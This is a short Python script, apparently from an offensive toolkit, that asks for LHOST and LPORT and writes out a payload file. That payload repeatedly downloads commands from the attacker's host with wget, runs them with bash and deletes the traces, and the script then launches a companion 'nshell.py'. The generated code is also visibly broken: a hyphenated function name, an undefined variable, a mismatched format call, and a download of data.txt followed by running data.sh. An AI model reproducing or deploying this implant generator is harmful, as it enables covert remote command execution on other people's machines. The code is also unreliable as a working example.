import os, time
import base64

os.chdir("../output/")
time.sleep(0.5)
opt = input("LHOST: ")
opt2 = input("LPORT: ")
opt3 = input("name: ")
op = open(opt3 + ".py", "w")
cod = """import os, time
os.system("python3 -m http.server {} &")
def get-put(ip):
	os.system("wget http://{}:{}/data.txt".format(ip))
	time.sleep(0.5)
	os.system("bash data.sh > data")
	os.remove("data.sh")
	time.sleep(1.5)
	os.remove("data")
	os.system("clear")
while True:
	get(ip)""".format(opt2, opt, opt2)
op1 = op.write(cod)
os.chdir("../nshell/")
os.system("python3 nshell.py")
